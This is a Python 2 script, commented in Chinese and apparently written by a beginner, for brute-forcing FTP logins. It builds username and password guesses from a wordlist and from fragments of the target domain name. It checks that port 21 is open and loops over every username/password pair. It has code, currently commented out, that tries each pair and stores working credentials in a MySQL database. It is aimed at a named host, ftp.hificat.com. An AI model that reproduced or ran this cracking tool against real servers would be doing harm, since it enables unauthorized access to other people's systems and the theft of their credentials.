#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################
#qq:316118740
#BLOG:http://hi.baidu.com/alalmn
# python FTP暴力破解部分代码
#  刚学写的不好请大家见谅
####################################################################

def open_txt():  #打开TXT文本写入数组
    try:
        xxx = file('admin.txt', 'r')
        for xxx_line in xxx.readlines():
            passlist.append(xxx_line)
        xxx.close()
    except:
        return 0

def list_del():  #清空list列表
    try:
        i = 0 #得到list的第一个元素
        while i < len(passlist):
            del passlist[i]
            del list_passwed[i]
    except:
        return 0

#def list_open():  #读取list列表
#    i = 0 #得到list的第一个元素
#    while i < len(list_passwed):
#        print "a[",i,"]",list_passwed[i]
#        i = i + 1

###########################################################################
def str_index(data1,data2):  #查找字符
    try:
        data1.index(data2)
        return 0
    except:
        return 1

def www_cj(sStr1):  #域名拆解
    sStr2 = "."
    passlist.append(sStr1)
    d1 = sStr1[0:sStr1.find(sStr2)]
    #print d1
    passlist.append(d1)
    sStr1 = sStr1[sStr1.find(sStr2)+1:]
    #print sStr1
    passlist.append(sStr1)
    if str_index(sStr1,sStr2):
        return 0
        #print "1111111111没有"
    else:
        #print "2222222222有了"
        d2 = sStr1[0:sStr1.find(sStr2)]
        #print d2
        passlist.append(d2)
        sStr1 = sStr1[sStr1.find(sStr2)+1:]
        #print sStr1
        passlist.append(sStr1)
        if str_index(sStr1,sStr2):
            return 0
            #print "222222没有"
        else:
            #print "2222222222有了"
            d3 = sStr1[0:sStr1.find(sStr2)]
            #print d3
            passlist.append(d3)
            sStr1 = sStr1[sStr1.find(sStr2)+1:]
            #print sStr1
            passlist.append(sStr1)
            if str_index(sStr1,sStr2):
                return 0
                #print "33333没有"
            else:
                #print "2222222222有了"
                d4 = sStr1[0:sStr1.find(sStr2)]
                #print d4
                passlist.append(d4)
                sStr1 = sStr1[sStr1.find(sStr2)+1:]
                #print sStr1
                passlist.append(sStr1)
                if str_index(sStr1,sStr2):
                    return 0
                    #print "44444没有"
                else:
                    #print "2222222222有了"
                    d5 = sStr1[0:sStr1.find(sStr2)]
                    #print d5
                    passlist.append(d5)
                    sStr1 = sStr1[sStr1.find(sStr2)+1:]
                    #print sStr1
                    passlist.append(sStr1)
                    if str_index(sStr1,sStr2):
                        return 0
                        #print "55555没有"
############################################################################打开FTP
from ftplib import FTP
#def ftp_open(host='',user='',passwd=''):  #打开FTP
#    try:
#        ftp=FTP()
#        #ftp.set_debuglevel(2) #打开调试级别2，显示详细信息
#        ftp.connect(host,'21') #连接
#        data=ftp.login(user,passwd) #登录，如果匿名登录则用空串代替即可
#        #print ftp.getwelcome()  #欢迎词
#        #print data
#        print "fffffffffffffffffffffffffffffffffff"
#        time.sleep(10)  #延时
#        ftp.quit() #退出ftp服务器
#        return 1
#    except:
#        return 0

def ftp_open(host,user,passwd):  #打开FTP
    try:
        ftp = FTP(host)
        ftp.login(user,passwd)
        ftp.quit()
        return 1
    except:
        return 0

###########################################################################
import time
def link_ftp(www):  #TXT导入数组    组合密码    遍历连接FTP
    #passlist = list(set(passlist))   #python 列表去重
    for i in passlist:
        if i not in list_passwed:
            list_passwed.append(i)
######################################   遍历数组组合出 密码
    I1 = 0 #得到list的第一个元素
    while I1 < len(list_passwed):
        #print "第几组密码：",I1
        if I1==len(list_passwed):
            break  #退出循环
        I2 = 0 #得到list的第一个元素
        while I2 < len(list_passwed):
            print u"IP:",www,u"用户名:",list_passwed[I1],u"密码:",list_passwed[I2]
#            if ftp_open(www,list_passwed[I1],list_passwed[I2]):  #打开FTP
#                print u"IP:",www,u"用户名:",list_passwed[I1],u"密码:",list_passwed[I2],u"打开FTP成功"
#                sql = "insert into ftp(IP,user,password) values('%s','%s','%s')"%(www,list_passwed[I1],list_passwed[I2])
#                print sql
#                mysql.mysql_insert(sql) #添加到数据库
#                #time.sleep(1)  #延时
#                #sql_sel() #SQL查询
#            else:
#                print u"IP:",www,u"用户名:",list_passwed[I1],u"密码:",list_passwed[I2],u"打开FTP失败"
            I2 = I2 + 1  #二层
        I1 = I1 + 1   #一层

    sql_sel() #SQL查询
###########################################################################
import socket
#获取域名的IP地址
def www_ip(name):  #域名转IP
    try:
        result = socket.getaddrinfo(name, None)
        return result[0][4][0]
    except:
        return 0

def ip_port(ip):  #查看IP端口是否开放
    port=21
    s=socket.socket()
    #address="127.0.0.1"
    try:
        s.connect((ip,port))
        #print 'IP:',ip,"port:",port,"以开放"
        return 1
    except socket.error,e:
        #print 'IP:',ip,"port:",port,"未开放"
        return 0
###########################################################################
def www_port(www):  #www转换IP在查看端口
    IP=www_ip(www)
    if IP:
        print www,u"ip地址：",IP
        if ip_port(IP):
            #print IP,"开放21端口"
            www_cj(www)  #域名拆解
            open_txt()   #TXT导入数组

            sql_up(www,"send") #SQL修改数据

            link_ftp(www)  #组合密码    遍历连接FTP
        else:
            sql_up(www,"---") #SQL修改数据
            print IP,u"未开21放端口"
            #sql_sel() #SQL查询
    else:
        sql_up(www,"===") #SQL修改数据
        print www,u"域名转IP失败"
        sql_sel() #SQL查询
###########################################################################
import mysql #数据库操作文件

def sql_up(url,data): #SQL修改数据
    try:
            up = "update  url1 set  ftpsend='%s' where url='%s'"%(data,url)
            if mysql.mysql_update(up):  #修改数据
                print url,u"修改数据库成功"
            else:
                print url,u"修改数据库失败"
            mysql.mysql_S()  #保存数据
    except:
        return 0

def sql_sel(): #SQL查询
    try:
        list_del()  #清空list列表
        sql="select * from url1 where ftpsend is NULL limit 1"
        mysql.cursor.execute(sql)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            www_port(row[0])  #www转换IP在查看端口
            #sql_cx(row[0])
            #print '%s-%s'%(row[0],row[1])
            #print row[0]
            #print row[1]
            #print row[2]
        #mysql.mysql_close()  #关闭数据库
    except:
        print u"读取URL异常！！！！！"
###########################################################################

if __name__=='__main__':
    mysql.mysql_open()  #连接数据库
    global  passlist  #声明全局变量
    passlist = []    #用户名：anonymous 密码为空
    global  list_passwed  #列表去重，不打乱原来的顺序
    list_passwed=[]

#    sql_sel() #SQL查询

    www= "ftp.hificat.com"
    www_port(www)  #www转换IP在查看端口



